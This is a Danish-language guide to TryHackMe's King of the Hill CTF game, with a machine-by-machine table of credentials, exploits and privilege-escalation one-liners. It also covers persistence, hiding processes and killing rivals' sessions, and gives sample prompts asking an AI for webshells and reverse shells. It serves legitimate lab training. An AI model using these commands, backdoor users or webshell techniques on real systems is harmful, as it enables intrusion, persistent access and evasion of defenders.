# King of the Hill: Praktisk vejledning

## Hvad er CTF og KoTH?

En CTF (Capture the Flag) er en sikkerhedskonkurrence, hvor deltagerne finder skjulte flags, korte strenge der beviser en løst opgave. De tre klassiske formater: **Jeopardy** (isolerede opgaver inden for web, krypto, reversing og forensics), **Attack-Defence** (hvert hold forsvarer egen maskine og angriber de andres) og **King of the Hill**, hvor alle kæmper om den samme maskine. KoTH er bindeledet: hack maskinen først, skriv dig ind som konge, forsvær tronen resten af runden.

**Hvorfor det er smart:** Én runde komprimerer en hel penetrationstest til 60 minutter. Du træner enumeration under tidspres, exploitation, privilege escalation og hardening i samme session, og modstanderne tvinger dig til at tænke som angriber og forsvarer samtidig. Det er lovlig øvelse på realistiske tilstande uden retsforfølgning, kun et scoreboard, og mønstrene genbruges direkte i certificeringer som OSCP og i det daglige arbejde.

**KoTH ift. MITRE ATT&CK:** En runde er en levende ATT&CK-øvelse. Portscanning er Reconnaissance, brute force og leakede credentials er Credential Access (T1110, T1078), kommandoinjektion og webshells er Execution (T1059, T1505.003), sudo- og SUID-misbrug er Privilege Escalation (T1548), chattr-låse, mount-binds og skjulte brugere er Persistence og Defense Evasion (T1098, T1564), og patchingen er hardening i praksis. Træn KoTH, og du har gået hele kill chainen på egen hånd.

**Hvordan bliver man bedre:** Maskintid slår teoritid. Spil de samme maskiner igen med nye vinkler, før noter pr. maskine over hvad der virkede, lær GTFOBins og LOLBAS udenad, og lær at læse linpeas-output i stedet for at kopiere det blindt. Målbilledet: fra "jeg fulgte en opskrift" til "jeg genkender mønstret og ved, hvad der skal patches".

**Spillet:** Op til 10 hackere, én maskine, 60 minutter. Kom først til root, skriv dit TryHackMe-brugernavn i `king.txt`, hold titlen, saml flags undervejs. Point optjenes pr. minut som konge. Kronen ligger i `/root/king.txt` (Linux), `c:\king.txt` (H1: Medium) eller `c:\Users\Administrator\king-server\king.txt` (Offline).

## Maskinpuljen (november 2026)

14 maskiner: 12 Linux, 2 Windows. Fireworks, Fortune og Hogwarts genererer porte og credentials tilfældigt ved hver reset: metoderne holder, de nøjagtige svar gør ikke.

| Maskine | Indgang (foothold) | Vej til root |
|---|---|---|
| **Carnage** | Upload af `.png.php` med Content-Type `image/png` på :82; skjult `dice.php` på :80 (input skrives baglæns) | `sudo -l`: suid `find`, `vim.tiny`, `netkit-ftp` (GTFOBins). NB: `king.txt` er append-only: `echo navn >> /root/king.txt` |
| **Fireworks** | Nyeste maskine, bygget i flere tilfældige varianter: fuld portscan og webopsøgning | `sudo nmap --interactive` og derefter `!sh` (GTFOBins) |
| **Food** | `telnet <IP> 46969` med cæsar-rote creds `food:givemecookies`; POST til `:15065/api/cmd` eksekverer som bread | suid `vim.basic`: rediger `/etc/sudoers` eller `/etc/passwd`; `screen` 4.5.0-exploit |
| **Fortune** | `curl <IP>:3333 | base64 -d > f.zip` og `fcrackzip -u -D -p rockyou.txt f.zip` giver ssh-creds; NFS-share uden root-squash | `sudo pico /etc/sudoers`; suid `find`, `nice`, `xargs` |
| **H1: Easy** | :8000 CMS med `admin:admin`: rediger side med webshell; :8002 eksekverer leveret PHP (`code=system(...);`) | serv2: `echo /bin/sh > /tmp/systemctl && chmod +x /tmp/systemctl && sudo PATH=/tmp:$PATH /usr/bin/restartServer`; serv3: root-cron kører `backup.sh` hvert minut |
| **H1: Hard** | XXE på `:80/api/user?xml` læser kilde og cookie, så RCE via `/shell`; :8888 API giver ssh-creds til :2222 | `su admin`, `sudo -i`, derefter docker.sock: container med `/` mountet, skriv egen nøgle til authorized_keys |
| **H1: Medium** (Win) | `cme smb <IP> -u achilles -p rockyou.txt` (crackmapexec), derefter `psexec.py` giver SYSTEM | Forsvar: `attrib +r c:\king.txt` og batch-loop |
| **Hackers** | hydra mod FTP/SSH (rcampbell, gcrawford) og web-backdoor `plague`: `hydra -l plague -P rockyou.txt -t 64 <IP> http-post-form "/api/login:username=^USER^&password=^PASS^:Incorrect"` | `sudo openssl enc -in <fil>` læser og skriver alt som root; `sudo pico`; python3.6 med setuid-capability |
| **Hogwarts** | Tilfældige porte. SSH-porten viser et website: `/permissions` afslører upload (Content-Type `application/pdf`), webshell som www-data; zip på FTP via zip2john; SQLi giver hermoine | suid `/etc/room_of_requirement` (overflow med `\xbe\xba\xfe\xca`); suid `ip netns add foo; ip netns exec foo /bin/sh -p`; `sudo easy_install` (draco) |
| **Offline** (Win) | WebDAV på :80 (cadaver) giver `scara:LeagueIsMyLove`; direkte: `psexec.py kingofthe.domain/svc_robotarmy:robots@<IP>` | mykull har SeBackup: ret ACL på Administrator-mappen. Kronen ligger i `king-server` |
| **Panda** | Kommandoshell i skjult mappe på :80; WordPress `po:password1`: webshell i 404.php | `sudo /usr/bin/ftp`, derefter `!/bin/sh`; suid `find`. Ingen `chattr` på maskinen |
| **Production** | FTP/SMB-share `/key` rummer ashus ssh-nøgle; backdoor på :9001 svarer på `yourmom!` | `sudo su skiddy`, derefter `sudo git -p help config` og `!/bin/sh`; suid `less`, `expand`, `git` |
| **Shrek** | `/api/search.php` med `search=f` giver FTP-creds; upload med `GIF87a`-header; robots.txt rummer shreks ssh-nøgle | `sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh`; suid `gdb`; docker-gruppen (puss) |
| **Tyler** | SMB-share `alert.txt` narrator-creds; LibreNMS på :8080 med `admin:admin` (exploit 47044); `/betatest` kommandoinjektion: `submit=submit&user=;id` | suid `vim` (`:py import os; os.execl("/bin/sh","sh","-p")`); knæk `/var/backups/shadow.bak` med `hashcat -m 1800` |

## Fremgangsmåde

1. **Forberedelse før start.** rockyou.txt på plads, statisk busybox klar (erstatning for chattr, når nogen sletter binæret), linpeas og pspy64 parate, en cheat-sheet pr. maskine (tabellen ovenfor). Notér hver løsning: genbrug sparer minutter næste spil.
2. **Enumeration (0-5 min).** `nmap -p- -sV --min-rate 2000 <IP>` eller rustscan. Hvorfor: maskinerne gemmer indgange på tilfældige høje porte (telnet 46969, netcat 3333). Derefter `gobuster dir -t 100`: skjulte mapper er standard-indgangen. Tjek altid `robots.txt` samt anonym FTP og SMB.
3. **Foothold.** Tag den hurtigste kendte vej fra tabellen. Hvert minut du eksperimenterer, er point til en anden. Stabiliser med det samme: egen ssh-nøgle i `authorized_keys`, og log ind med `ssh -T` så din session ikke vises i `who`.
4. **Kronen.** `echo NAVN > /root/king.txt` (Windows: `echo NAVN > c:\king.txt`). Tjek scoreboardet: filen læses af king-service på port 9999.
5. **Forsvar, resten af spillet.**
   - Lås filen: `chattr +i /root/king.txt` (Windows: `attrib +r`).
   - Loop uden fil: `while true; do echo -n NAVN >| /root/king.txt; sleep 0.1; done &`. Skrevet i terminalen ses kun `sleep` under `ps`; en fil afslører hele opskriften.
   - Patch indgangene: `chmod -s $(which find)` fjern suid-biten, `rm /etc/sudoers.d/*`, `passwd root`, og ret sårbare PHP-filer med input-validering i stedet for at dræbe servicen.
   - Persistence, for rivalerne kommer og rydder: ssh-nøgle i `/root/.ssh/authorized_keys`; `cp /bin/sh /home/.s && chmod u+s /home/.s`; ekstra root-bruger: `echo 'u:$1$u$rAGRVf5p2jYTqtqOW5cPu/:0:0::/root:/bin/bash' >> /etc/passwd`; `echo 'navn ALL=(ALL:ALL) NOPASSWD:ALL' >> /etc/sudoers`.
6. **Flags.** De ligger spredt i hjemmemapper, `/var`, configs og databaser: `find / -name "*flag*" 2>/dev/null` og `grep -riE "flag\{|thm\{" / 2>/dev/null`. Ekstra point, lav prioritet indtil kronen sidder fast.
7. **Rivaler.** `w` og `ps aux | grep pts` viser hvem der er på maskinen. `pkill -9 -t pts/N` rydder en session. `mount -o bind /tmp /proc/<PID>` skjuler din egen proces. Kører en modstander et king-loop, afslører pspy64 det.

## Regler

- Port 9999 er king-service: rør den ikke.
- Slet eller flyt ikke flags. Sabotér ikke maskinen: `rm -rf /usr/bin/*` og lignende er bandlyst, maskinen skal holdes brugbar for alle.
- Ingen autopwn-scripts i offentlige spil. Reset kun ved nedbrud, ikke fordi maskinen er patchet.
- Shell-kills er tilladt, men spil som en gentleman: patch vejen i stedet for at spamme kill. Misbrug rapporteres til koth@tryhackme.com.
- Rootkits er tilladte, men må ikke gøre maskinen ubrugelig. Før en modstander loader et: `sysctl -w kernel.modules_disabled=1`.

## Værktøjsskab

GTFOBins (sudo- og SUID-udnyttelse), ExploitDB (versionsspecifikke exploits), crackmapexec og psexec.py (Windows), zip2john, fcrackzip, hashcat og hydra (credentials), statisk busybox (når chattr er slettet: samme filstørrelse afslører skjulte kopier), reverse_ssh eller pwncat (stabile shells, virker også når ssh er lukket).

## Hacking KoTH med AI (Mistral Vibe)

AI er en copilot, ikke en autopilot. TryHackMe bandlyser autopwn-scripts i offentlige spil, og AI, der vinder spillet for dig, er det samme i pænere tøj. Brugt rigtigt er Vibe en sparringspartner, der sparer minutter og lærer dig mønstrene:

- **Før spillet:** bed om et cheat-sheet pr. maskine (som tabellen ovenfor), en gennemgang af GTFOBins-mønstre eller en øveplan. Lad AI'en forklare værktøjer og angrebsmønstre, du ikke kender endnu, så du møder maskinen med forståelse i stedet for gættearbejde.
- **Under enumeration:** indsæt dit nmap- eller gobuster-output, og få de tre mest sandsynlige indgange med begrundelse. AI læser godt på tværs af porte og versionsnumre, der hvor du ser en mur af tekst.
- **Under privesc:** indsæt `sudo -l` og output fra `find / -perm /4000`, og bed om den hurtigste vej til root med GTFOBins-kommandoer. Eller indsæt linpeas-output og få de vigtigste fund forklaret ét ad gangen.
- **Payloads og patching:** få genereret reverse shells, PHP-webshells der består en Content-Type-kontrol (`image/png`), eller et patch-forslag til en sårbar PHP-fil, klart til copy-paste.
- **Efter spillet:** replay er gratis læring. Indsæt dine noter, og stil spørgsmålet: hvad overså jeg, og hvad skulle være blevet patchet først?

Konkrete prompts der virker:

1. "Her er mit nmap-output: [indsæt]. Hvilke tre indgange er mest sandsynlige på en KoTH-maskine, og hvorfor?"
2. "`sudo -l` viser [X], og SUID-listen er [Y]. Giv den hurtigste vej til root med GTFOBins-kommandoer."
3. "Forklar dette linpeas-fund, og giv kommandoen der udnytter det: [indsæt]."
4. "Generér en PHP-kommandoshell, der består en Content-Type-kontrol af image/png."
5. "Jeg er root på [maskine]. Giv en prioriteret forsvars- og persistenscheckliste."

Holdningen er enkel: verificér alt. AI hallucinerer også exploits, og hvert minut brugt på en falsk kommando er et point til modstanderen. Små prompter, konkrete outputs, og behold forståelsen hos dig selv: pointen er, at du bliver bedre, ikke afhængig.
